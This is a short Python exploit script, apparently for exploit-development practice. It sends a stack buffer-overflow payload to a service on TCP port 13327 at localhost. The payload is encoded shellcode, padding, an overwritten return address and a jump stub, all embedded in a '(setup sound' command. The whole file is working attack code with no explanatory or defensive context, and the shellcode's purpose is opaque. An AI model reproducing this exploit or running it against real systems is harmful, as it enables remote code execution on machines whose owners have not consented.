#!/usr/bin/ python

import socket

host = "127.0.0.1"


shellcode = ("\xbd\x81\xd0\x84\xf4\xdb\xc8\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x14\x31\x68\x14\x83\xc0\x04\x03\x68\x10\x63\x25\xb5\x2f\x94"
"\x25\xe5\x8c\x09\xc0\x08\x9a\x4c\xa4\x6b\x51\x0e\x9e\x2d\x3b"
"\x66\x23\xd2\xaa\x2a\x49\xc2\x9d\x82\x04\x03\x77\x44\x4f\x09"
"\x08\x01\x2e\x95\xba\x15\x01\xf3\x71\x95\x22\x4c\xef\x58\x24"
"\x3f\xa9\x08\x1a\x18\x87\x4c\x2d\xe1\xef\x24\x81\x3e\x63\xdc"
"\xb5\x6f\xe1\x75\x28\xf9\x06\xd5\xe7\x70\x29\x65\x0c\x4e\x2a")

ret = "\x97\x45\x13\x08"

crash = shellcode + "\x41" * (4368 - 105) + ret + "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"
#"\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("[*] Sending evil buffer...")

s.connect((host, 13327))

data = s.recv(1024)
print(data)

s.send(buffer)


s.close()

print("Payload sent")